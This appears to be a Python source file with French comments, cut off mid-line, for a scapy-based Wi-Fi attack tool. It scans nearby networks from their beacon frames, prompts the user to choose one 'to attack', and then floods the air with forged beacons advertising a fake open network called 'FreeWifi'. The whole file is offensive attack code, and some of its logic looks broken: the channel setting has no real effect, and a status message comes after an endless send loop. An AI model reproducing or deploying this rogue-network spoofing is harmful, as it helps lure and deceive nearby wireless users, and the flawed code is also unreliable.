from scapy.all import *

# Fonction pour extraire les informations d'un paquet Beacon
def extract_beacon_info(packet):
    if packet.haslayer(Dot11Beacon):
        ssid = packet[Dot11Elt].info.decode()
        bssid = packet[Dot11].addr3
        channel = int(ord(packet[Dot11Elt:3].info))
        power = packet.dBm_AntSignal
        return (ssid, bssid, channel, power)
    else:
        return None

# Fonction pour scanner les réseaux environnants
def scan_networks():
    print("Scan en cours...")
    networks = []
    # Scan des paquets Beacon sur tous les canaux 1 à 14
    for channel in range(1, 15):
        # Configuration du canal pour le scan
        conf.iface = "wlan0mon"
        conf.channel = str(channel)
        # Capture des paquets pendant 0,5 seconde sur chaque canal
        packets = sniff(timeout=0.5)
        # Extraction des informations des paquets Beacon
        for packet in packets:
            network = extract_beacon_info(packet)
            if network and network not in networks:
                networks.append(network)
    return networks

# Fonction pour afficher les réseaux découverts
def print_networks(networks):
    print("Liste des réseaux disponibles :")
    for i, network in enumerate(networks):
        ssid, bssid, channel, power = network
        print(f"{i+1}. {ssid} (BSSID : {bssid}), Canal : {channel}, Puissance : {power} dBm")

# Fonction pour permettre à l'utilisateur de choisir un réseau à attaquer
def choose_network(networks):
    choice = -1
    while choice < 1 or choice > len(networks):
        try:
            choice = int(input("Veuillez sélectionner le numéro du réseau à attaquer : "))
        except ValueError:
            print("Choix invalide. Veuillez entrer un numéro valide.")
    return networks[choice-1]

# Fonction pour générer un beacon concurrent annonçant un faux réseau
def generate_fake_network(network):
    ssid, bssid, channel, power = network
    fake_ssid = "FreeWifi" # Nom du faux réseau
    fake_bssid = RandMAC() # Adresse MAC aléatoire pour le faux BSSID
    fake_channel = (channel + 6) % 14 + 1 # Canal 6 canaux plus loin
    # Configuration du canal pour l'envoi du faux paquet
    conf.iface = "wlan0mon"
    conf.channel = str(fake_channel)
    # Génération du paquet Beacon
    packet = RadioTap() / Dot11(type=0, subtype=8, addr1="ff:ff:ff:ff:ff:ff", addr2=fake_bssid, addr3=fake_bssid) / Dot11Beacon(cap="ESS") / Dot11Elt(ID="SSID", info=fake_ssid, len=len(fake_ssid))
    # Envoi du paquet en boucle
    sendp(packet, inter=0.1, loop=1)
    print(f"Un faux réseau ({fake_ssid}) a été généré sur le canal {fake_channel} ({conf.channel}).")

# Fonction principale
def main():
    # Scan des réseaux environnants
    networks = scan
